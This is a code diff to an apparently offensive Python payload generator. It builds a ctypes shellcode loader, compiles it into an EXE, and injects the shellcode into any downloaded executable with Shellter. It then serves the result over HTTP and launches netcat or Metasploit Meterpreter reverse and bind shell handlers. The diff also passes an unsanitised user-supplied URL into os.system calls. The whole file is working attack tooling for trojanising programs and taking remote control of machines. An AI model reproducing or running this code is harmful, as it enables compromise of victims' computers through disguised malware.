@@ -13,6 +13,7 @@ import multiprocessing
 from Crypto.Cipher import AES
 import base64
 import string
+import re
 
 t = blessings.Terminal()
 try:
@@ -229,14 +230,13 @@ try:
         shellcode = payloadchoice % (bindporthex)
 
     want_to_payloadinexe = raw_input(
-        '[*] Include Shellcode In Already Compiled Exe?(Putty.exe) y/[n]: ')
+        '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ')
 
     for byte in shellcode:
         ez2read_shellcode += '\\x%s' % byte.encode('hex')
 
     injectwindows = """#/usr/bin/python
 import ctypes
-
 
 shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
@@ -245,15 +245,15 @@ ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shel
 ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """ % ez2read_shellcode
+
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
             Filesave.write(PyCipher(injectwindows))
             Filesave.close()
-        print 'test'
 
         print '[*] Creating Payload.exe From Payload.py...'
 
-        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
+        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/usr/share/pyinstaller/pyinstaller.py',
                          '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print '[*] Cleaning Up...'
         os.system('mv %s/dist/payload.exe %s/payload.exe' %
@@ -266,6 +266,8 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
+        payloadinexe_payloadname = raw_input(
+            '[*] EXE Filepath or URL to EXE: ')
         os.chdir(os.getcwd() + '/shellter')
         try:
             os.mkdir('compiled')
@@ -274,16 +276,18 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         with open('payloadbin', 'wb') as Csave:
             Csave.write(shellcode)
             Csave.close()
-        os.system('rm putty.*')
-        os.system('wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe')
-        os.system('wine shellter.exe -a -f putty.exe -s -p payloadbin ')
-        os.system('mv putty.exe ./compiled/putty.exe')
+        if re.search('http',payloadinexe_payloadname):
+            os.system('wget %s'%payloadinexe_payloadname)
+            payloadinexe_payloadname = re.search('(\w*.exe)',payloadinexe_payloadname)
+            payloadinexe_payloadname = payloadinexe_payloadname.group(1)
+        os.system('wine shellter.exe -a -f %s -s -p payloadbin '% payloadinexe_payloadname)
+        os.system('mv %s ./compiled/%s'%(payloadinexe_payloadname,payloadinexe_payloadname))
 
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever? [y]/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
         if want_to_payloadinexe == 'y':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/putty.exe" % (IP) + t.normal
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP,payloadinexe_payloadname) + t.normal
             t = multiprocessing.Process(target=ServePayload, args = (os.getcwd() + '/compiled',))
             t.start()
         else:
@@ -294,12 +298,12 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;exploit\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
             '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;exploit \'' % (bindport, bindip))
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;exploit \'' % (bindport, bindip))
     elif menuchoice == '4':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;exploit\'' % portnum)
 except KeyboardInterrupt:
     sys.exit(1)
